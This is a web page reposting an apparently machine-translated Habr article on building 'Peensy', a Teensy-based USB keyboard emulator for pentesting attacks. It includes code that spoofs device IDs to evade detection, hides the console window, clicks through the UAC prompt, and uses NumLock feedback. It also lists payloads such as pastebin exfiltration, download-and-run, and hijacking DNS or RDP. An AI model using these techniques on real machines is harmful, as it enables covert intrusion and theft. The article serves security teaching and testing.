<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Evil USB HID-emulator or just Peensy</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="An interesting attack vector is the use of USB HID keyboard (and mouse) emulators in a standard USB flash drive. And if autofun.inf on a flash drive, ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Evil USB HID-emulator or just Peensy</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/storage2/9dd/e33/62f/9dde3362fb15b1817cb9b26cbcd3c4d1.jpg"><br><br>  An interesting attack vector is the use of USB HID keyboard (and mouse) emulators in a standard USB flash drive.  And if autofun.inf on a flash drive, we have already learned how to search and destroy, then with HID emulators everything is so bad. <br><br>  For those who are not familiar with this topic yet, I recommend reading the ‚Äú <a href="http://habrahabr.ru/company/dsec/blog/141838/">Battle HID-emulator on Arduino</a> ‚Äù habrostaty for a start.  Here I will not touch on the issues of installing and configuring the Arduino programming environment, but rather a little bit about the advanced use of Peensy (Pentest + Teensy). <br><a name="habracut"></a><br><h4>  Iron </h4><br>  The first thing to start with is to buy a Teensy <a href="http://www.pjrc.com/store/sd_adaptor.html">MicroSD adapter</a> and a DIP switch.  The first is needed in order for Peensy to emulate not only the keyboard, but also the flash drive itself.  Yes, and store ready-made scripts on a flash drive is more convenient than ‚Äústuffing‚Äù them again each time.  DIP switch will help in the field to choose the desired load, or, for example, switch between 32-bit and 64-bit version of the script. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The finished Peensy will look something like this: <br><br><img src="https://habrastorage.org/storage2/589/51b/13c/58951b13c80d8aec71524c3904396abb.jpg"><br><br>  You can immediately buy a ready-to-work <a href="http://hakshop.myshopify.com/products/usb-rubber-ducky">rubber duck</a> . <br><br><img src="https://habrastorage.org/storage2/8ee/90f/018/8ee90f0188caa518b4d510e052df6477.jpg"><br><br><h4>  Hiding Peensy </h4><br>  Some defenses have already learned to detect and block Peensy.  But they do it on a bunch of VendorID &amp; ProductID, which we can change in the Arduino programming environment. <br>  We are looking for files \ arduino-1.0.1-windows \ arduino-1.0.1 \ hardware \ teensy \ cores \ usb_hid \ usb_private.h and change the corresponding parameters to the parameters of the <a href="">Kingston flash drive</a> , for example.  In addition, we scroll the file further and change the STR_PRODUCT parameter from ‚ÄúTeensy‚Äù to ‚ÄúKingston DataTraveler 2Gb‚Äù.  Now, when installing the Peensy drivers, we can only be given a composite device driver instead of the usual, storage device.  But who will pay attention to this? <br><br>  Peensy's main job is in the cmd window.  By adding a pair of keys, we can make the command window much less noticeable: <br><br><pre><code class="bash hljs">cmd /T:01 /K <span class="hljs-string"><span class="hljs-string">"@echo off &amp;&amp; mode con:COLS=15 LINES=1 &amp;&amp; title Installing Drivers"</span></span></code> </pre> <br><img src="https://habrastorage.org/storage2/c4f/c0e/887/c4fc0e887b0848aafcd6dfb86274f30b.png"><br><br><h4>  Enable feedback </h4><br>  A significant drawback of the Teensy was the use of a giant delay in the beginning of the device operation, which was necessary for the initial installation of drivers.  In the Kautilya framework, the initial default delay is 25 seconds.  For 25 seconds, you can even have time to throw the "necessary documents" from a colleague on the "flash drive" and turn it off.  And if the driver is installed, say, in 30 seconds, then instead of the CMD window, Peensy will put his combat script directly into the open Word window. <br><br>  The lack of feedback and a huge delay for the initial installation of drivers significantly reduced the effectiveness of Peensy ... until you came up with the use of NumLock for this purpose! <br><br>  When you press the NumLock key, the system transmits a command to the keyboard to light the corresponding diode.  This feature can be used for feedback in the Peensy code. <br><br>  Change the 25 second delay to check the system response to pressing the Peensy NumLock key. <br><br><pre> <code class="bash hljs">int ledkeys(void) {<span class="hljs-built_in"><span class="hljs-built_in">return</span></span> int(keyboard_leds);} bool is_num_on(void) {<span class="hljs-built_in"><span class="hljs-built_in">return</span></span> ((ledkeys() &amp; 1) == 1) ? <span class="hljs-literal"><span class="hljs-literal">true</span></span> : <span class="hljs-literal"><span class="hljs-literal">false</span></span>;} void <span class="hljs-function"><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">wait_for_drivers</span></span></span></span>() { bool numLockTrap = is_num_on(); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(numLockTrap == is_num_on()) //  NumLock      { Keyboard.set_key1(KEY_NUM_LOCK); Keyboard.send_now(); // NumLock delay(200); Keyboard.set_modifier(0); Keyboard.set_key1(0); Keyboard.send_now(); // delay(200); } }</code> </pre><br>  Now we can check whether PowerShell is installed on the system. <br>  Make sure the NumLock is off <br><br><pre> <code class="bash hljs"> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (is_num_on()) { delay(500); Keyboard.set_key1(KEY_NUM_LOCK); Keyboard.send_now(); delay(700); Keyboard.set_modifier(0); Keyboard.set_key1(0); Keyboard.send_now(); delay(500); }</code> </pre><br>  Turn it on via PowerShell (cmd must be open) <br><br><pre> <code class="bash hljs">Keyboard.println(<span class="hljs-string"><span class="hljs-string">"echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{NUMLOCK}\"' &gt; numlock.vbs"</span></span>); delay(400); Keyboard.println(<span class="hljs-string"><span class="hljs-string">"cscript numlock.vbs"</span></span>); delay(400);</code> </pre><br>  Now it remains only to check the status of NumLock using is_num_on () to understand whether the script has worked or not. <br><br>  NumLock checks (as well as Caps and Scroll lock) can be inserted into any part of the Peensy code.  For example, you can check whether the user has removed the focus from the CMD window, whether the script has worked correctly, etc. <br><br><h4>  Run the command prompt with administrator rights </h4><br>  To launch the command prompt with administrator rights, you must click WinKey, type in ‚Äúcmd‚Äù, press Ctrl + Shift + Enter and in the UAC window that appears, press ‚Äúleft‚Äù + Enter. <br><br>  In Peensy code, it will look like this: <br><br><pre> <code class="bash hljs"> Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI); Keyboard.send_now(); // WinKey delay(400); Keyboard.set_modifier(0); Keyboard.send_now(); // delay(100); Keyboard.print(<span class="hljs-string"><span class="hljs-string">"cmd /T:01 /K \"@echo off &amp;&amp; mode con:COLS=15 LINES=1 &amp;&amp; title Installing Drivers\" "</span></span>); // cmd delay(400); Keyboard.set_modifier(MODIFIERKEY_CTRL); Keyboard.send_now(); Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT); Keyboard.send_now(); Keyboard.set_key1(KEY_ENTER); Keyboard.send_now(); // cmd    delay(400); Keyboard.set_modifier(0); Keyboard.set_key1(0); Keyboard.send_now(); // ctrl+<span class="hljs-built_in"><span class="hljs-built_in">shift</span></span>+enter delay(400); Keyboard.set_key1(KEY_LEFT); Keyboard.send_now(); //  delay(100); Keyboard.set_key1(0); Keyboard.send_now(); Keyboard.set_key1(KEY_ENTER); Keyboard.send_now(); // enter delay(100); Keyboard.set_key1(0); Keyboard.send_now();</code> </pre><br><br>  This code will work in 2 seconds.  You can try to reduce to 1. <br><br>  Most of the workloads for Peensy require administrative rights, however there are some interesting scripts (for example, a keylogger with a link to all keystrokes pressed on pastebin), which will quietly run with user rights. <br><br>  If habrayuzmera will be interested in this topic, I will analyze some interesting scripts in the following articles.  However, the scripts can be downloaded and studied independently from the <a href="http://labofapenetrationtester.blogspot.in/2012/09/usb-hid-for-pen-testers-part5.html">blog of the author Kautilya Nikhil Mittal</a> . <br><br><h4>  Conclusion </h4><br>  The spectrum and capabilities of Peensy are growing every day.  On a fast, modern computer, Peensy is able to shed its load in seconds, making it discreet enough to not be detected by most PC users. <br><br>  Having feedback using the NumLock and / or ScrollLock keys allows you to create adaptive and fault-tolerant loads.  Using the same PowerShell greatly expands the possibilities of the attacker. <br><br>  Using PowerShell, for example, you can: <br>  - send information about the system / contents of the specified file to pastebin.com using the hidden Internet Explorer window; <br>  - change the DNS server (which will allow to control the Internet activity of the user); <br>  - download and run the executable file; <br>  - edit the HOSTS file (it is necessary to substitute web pages, for example, the client bank); <br>  - enable the RDP protocol and configure it to connect the attacker; <br>  - install a script keylogger or sniffer; <br>  - raise the wifi access point with the specified parameters, etc. <br><br>  Here is a small demonstration of the work of Teensy on a real machine with a load in the form of a notepad with admin rights. <br><br><iframe width="560" height="315" src="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://www.youtube.com/embed/VB88iLCp8Ig%3Ffeature%3Doembed&amp;xid=17259,15700021,15700186,15700191,15700253,15700256,15700259&amp;usg=ALkJrhj8JUKIuaFc3H7ZaQH2_VQnN8_pMw" frameborder="0" allowfullscreen=""></iframe><br><br><h4>  What else to read? </h4><br><ul><li>  <a href="http://www.offensive-security.com/offsec/advanced-teensy-penetration-testing-payloads/">Advanced teensy penetration testing payloads</a> ; </li><li>  <a href="http://labofapenetrationtester.blogspot.in/">Nikhil Mittal blog</a> ; </li><li>  <a href="http://habrahabr.ru/company/dsec/blog/141838/">Battle HID-emulator for Arduino</a> . </li></ul></div><p>Source: <a href="https://habr.com/ru/post/153571/">https://habr.com/ru/post/153571/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../153553/index.html">Moscow will no longer be the same</a></li>
<li><a href="../153555/index.html">For the first time broadband information was transmitted via the laser channel to the ground station from the ISS</a></li>
<li><a href="../153557/index.html">The richest IT pros on this street</a></li>
<li><a href="../153565/index.html">Report from the past Facebook Developers World Hack Day Moscow</a></li>
<li><a href="../153569/index.html">Using dreams to test a project</a></li>
<li><a href="../153573/index.html">Kyocera - applications and tools</a></li>
<li><a href="../153575/index.html">IT Knowledge Base in your company</a></li>
<li><a href="../153579/index.html">Notification by mail from 1C</a></li>
<li><a href="../153581/index.html">Security, instructions and integrators</a></li>
<li><a href="../153583/index.html">Facebook has taken over a billion active users</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>